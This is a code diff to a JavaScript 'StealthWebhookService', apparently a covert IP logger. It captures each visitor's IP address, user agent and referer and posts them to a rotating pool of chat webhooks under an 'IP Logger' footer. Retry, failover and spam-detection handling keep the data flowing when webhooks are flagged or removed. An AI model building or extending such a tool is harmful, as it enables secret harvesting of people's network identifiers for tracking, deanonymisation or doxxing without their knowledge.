@@ -110,13 +110,24 @@ class StealthWebhookService {
   getWebsiteUrl(req) {
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const host = req.headers['x-forwarded-host'] || req.get('host');
-    return `${protocol}://${host}`;
+    const url = `${protocol}://${host}`;
+    console.log('🌐 Detected website URL:', url);
+    console.log('🌐 Headers debug:', {
+      'x-forwarded-proto': req.headers['x-forwarded-proto'],
+      'x-forwarded-host': req.headers['x-forwarded-host'],
+      'host': req.get('host'),
+      'protocol': req.protocol
+    });
+    return url;
   }
 
   // Get website name from request
   getWebsiteName(req) {
     const host = req.headers['x-forwarded-host'] || req.get('host');
-    return host.replace(/^www\./, '').split('.')[0] || 'Unknown Site';
+    const websiteName = host.replace(/^www\./, '').split('.')[0] || 'Unknown Site';
+    console.log('🌐 Detected website name:', websiteName);
+    console.log('🌐 Host for name extraction:', host);
+    return websiteName;
   }
 
   // Rate limiting protection
@@ -414,17 +425,73 @@ class StealthWebhookService {
     }
   }
 
+  // Get website information from request
+  getWebsiteInfo(req) {
+    try {
+      const host = req.headers.host || 'unknown';
+      const origin = req.headers.origin || '';
+      const referer = req.headers.referer || '';
+      
+      // Determine website URL and name
+      let websiteUrl = origin || `https://${host}`;
+      let websiteName = host.split('.')[0]; // Extract subdomain or domain name
+      
+      // Clean up website name
+      if (websiteName === 'www') {
+        websiteName = host.split('.').slice(1, -1).join('.');
+      }
+      
+      // Handle custom domains better
+      if (host.includes('.vercel.app')) {
+        // Vercel subdomain
+        websiteName = host.split('.')[0];
+      } else if (host.split('.').length === 2) {
+        // Custom domain (e.g., example.com)
+        websiteName = host.split('.')[0];
+      } else if (host.split('.').length > 2) {
+        // Subdomain (e.g., sub.example.com)
+        websiteName = host.split('.')[0];
+      }
+      
+      // Capitalize first letter
+      websiteName = websiteName.charAt(0).toUpperCase() + websiteName.slice(1);
+      
+      // Fallback to environment variable if available
+      if (process.env.WEBSITE_NAME) {
+        websiteName = process.env.WEBSITE_NAME;
+      }
+      
+      console.log('🌐 Website info detected:', {
+        host,
+        origin,
+        referer,
+        websiteUrl,
+        websiteName
+      });
+      
+      return { websiteUrl, websiteName };
+    } catch (error) {
+      console.error('❌ Error getting website info:', error.message);
+      return {
+        websiteUrl: process.env.WEBSITE_URL || 'https://unknown.com',
+        websiteName: process.env.WEBSITE_NAME || 'Unknown Website'
+      };
+    }
+  }
+
   // Send message to webhook with retry logic and spam detection
   async sendMessage(payload, req) {
     try {
       console.log('📤 Starting webhook message send...');
       await this.checkRateLimit();
 
-      const clientIP = this.getClientIP(req);
+      // Get client information
+      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
       const userAgent = req.headers['user-agent'] || 'Unknown';
       const timestamp = new Date().toISOString();
-      const websiteUrl = this.getWebsiteUrl(req);
-      const websiteName = this.getWebsiteName(req);
+      
+      // Get website information
+      const { websiteUrl, websiteName } = this.getWebsiteInfo(req);
 
       console.log('📤 Message details:', {
         clientIP,
@@ -433,46 +500,44 @@ class StealthWebhookService {
         userAgent: userAgent.substring(0, 50) + '...'
       });
 
-      // Enhanced payload with IP information
+      // Create enhanced payload with website info
       const enhancedPayload = {
-        ...payload,
-        embeds: [
-          {
-            title: "🔍 IP Address Detected",
-            color: 0x00ff00,
-            fields: [
-              {
-                name: "🌐 IP Address",
-                value: clientIP,
-                inline: true
-              },
-              {
-                name: "🕒 Timestamp",
-                value: timestamp,
-                inline: true
-              },
-              {
-                name: "🌍 User Agent",
-                value: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : ''),
-                inline: false
-              },
-              {
-                name: "🔗 Referer",
-                value: req.headers.referer || 'Direct Access',
-                inline: false
-              },
-              {
-                name: "🌐 Website",
-                value: websiteUrl,
-                inline: true
-              }
-            ],
-            footer: {
-              text: `${websiteName} - Automated IP Logger`
+        embeds: [{
+          title: `🌐 New Visitor on ${websiteName}`,
+          description: `Someone visited your website!`,
+          color: 0x00ff00,
+          fields: [
+            {
+              name: '📍 IP Address',
+              value: `\`${clientIP}\``,
+              inline: true
             },
-            timestamp: timestamp
-          }
-        ]
+            {
+              name: '🌍 Website',
+              value: `\`${websiteUrl}\``,
+              inline: true
+            },
+            {
+              name: '🕒 Timestamp',
+              value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+              inline: true
+            },
+            {
+              name: '🔍 User Agent',
+              value: `\`\`\`${userAgent}\`\`\``,
+              inline: false
+            },
+            {
+              name: '📱 Referer',
+              value: req.headers.referer ? `\`${req.headers.referer}\`` : '`Direct Visit`',
+              inline: false
+            }
+          ],
+          footer: {
+            text: `${websiteName} IP Logger • ${new Date().toLocaleDateString()}`
+          },
+          timestamp: timestamp
+        }]
       };
 
       console.log('📤 Enhanced payload created');
@@ -484,9 +549,9 @@ class StealthWebhookService {
         try {
           console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
           const webhook = await this.getNextAvailableWebhook();
-          
+
           console.log(`📤 Using webhook: ${webhook.id}`);
-          
+
           // Check for spam before sending
           if (this.checkSpam(webhook.id)) {
             console.log(`🚨 Spam detected on webhook ${webhook.id}, handling...`);
@@ -512,18 +577,20 @@ class StealthWebhookService {
             webhook.lastUsed = Date.now();
             webhook.failureCount = 0;
             webhook.lastFailure = null;
-            
+
             console.log('✅ Webhook message sent successfully');
             return {
               success: true,
               webhookId: webhook.id,
-              message: 'Message sent successfully'
+              message: 'Message sent successfully',
+              websiteName,
+              websiteUrl
             };
           } else {
             // Handle different error responses
             const responseText = await response.text();
             console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);
-            
+
             if (response.status === 404) {
               webhook.status = 'inactive';
               webhook.failureCount++;
@@ -539,13 +606,13 @@ class StealthWebhookService {
               webhook.lastFailure = Date.now();
               console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
             }
-            
+
             lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
           }
         } catch (error) {
           console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
           lastError = error;
-          
+
           // Mark current webhook as failed
           if (this.webhooks[this.currentWebhookIndex]) {
             this.webhooks[this.currentWebhookIndex].failureCount++;
